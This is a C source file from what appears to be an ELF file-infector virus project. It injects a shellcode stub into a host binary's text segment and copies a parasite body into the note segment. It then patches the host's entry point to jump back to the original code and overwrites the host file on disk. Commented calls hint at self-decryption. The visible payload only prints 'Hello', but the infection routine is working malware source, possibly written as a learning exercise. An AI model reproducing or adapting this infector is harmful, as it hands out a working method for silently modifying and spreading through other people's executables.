#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void write_on_memory(char *dst, char *src, Elf64_Phdr **segment)
{
	const size_t beg_stub = (segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE;
	const size_t end_stub = PAGE_SIZE + STUB_SIZE;
	const size_t beg_parasite = (segment[DATA]->p_offset + segment[DATA]->p_filesz) - (beg_stub + end_stub);
	const size_t end_parasite = segment[NOTE]->p_filesz + (segment[NOTE]->p_offset - (segment[DATA]->p_offset + segment[DATA]->p_filesz));

	for (register size_t index = 0; index < beg_stub; index++)
		*dst++ = *src++;
	for (register size_t index = 0; index < end_stub; index++)
		*dst++ = '*';

	src += STUB_SIZE;

	for (register size_t index = 0; index < beg_parasite; index++)
		*dst++ = *src++;
	for (register size_t index = 0; index < end_parasite; index++)
		*dst++ = '*';
}

__attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_Phdr **segment)
{
	uint8_t stub[] =
	{
		0x55, 0x54, 0x57, 0x56, 0x52, 0xe8, 0x06, 0x00, 0x00, 0x00,
		0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x0a, 0xbf, 0x01, 0x00, 0x00,
		0x00, 0x5e, 0xba, 0x06, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x00,
		0x00, 0x00, 0x0f, 0x05, 0x5a, 0x5e, 0x5f, 0x5c, 0x5d, 0xe9,
		0xba, 0xba, 0xfe, 0xca
	};

	const size_t jump_offset = sizeof(stub) - JUMP_SIZE;
	const size_t entry_point = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - JUMP_OFFSET);

	_memcpy(&stub[jump_offset], &entry_point, sizeof(int));
	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE), stub, sizeof(stub));
}

__attribute__((always_inline)) static inline void insert_parasite(char *dst, Elf64_Phdr **segment)
{
	_memcpy(dst + segment[NOTE]->p_offset, __entry, segment[NOTE]->p_filesz);
}

__attribute__((always_inline)) static inline void patch_entry_point(char *dst, const struct s_host *host)
{
	size_t offset = JUMP_SIZE;

	dst += host->segment[NOTE]->p_offset + ((void *)execution - (void *)__entry);

	while (true)
	{
		if (*(unsigned char *)dst == 0xe9)
		{
			dst++;
			offset++;
			break;
		}
		offset++;
		dst++;
	}

	const size_t entry_point = host->entry[OLD] - (host->segment[NOTE]->p_vaddr + (((void *)execution + offset) - (void *)__entry));

	_memcpy(dst, &entry_point, sizeof(int));
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

#if DEBUG
	MID_TRACER("injection:\t\t");
#endif

	if (context == FAILURE)
		goto label;

	char *ptr;
	int fd;

	const size_t filesize = host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz;

	if ((ptr = _mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
	{
		context = FAILURE;
		goto label;
	}

	write_on_memory(ptr, (char *)host->header, host->segment);
	insert_stub(ptr, host->segment);
	insert_parasite(ptr, host->segment);
	patch_entry_point(ptr, host);
//	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);

	if ((fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
	{
		context = FAILURE;
		goto label;
	}

	_write(fd, ptr, filesize);
	_close(fd);
	_munmap(ptr, filesize);
	_munmap(host->header, host->filesize);

label:
//	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);

	autodestruction(host, keychain, context);
}
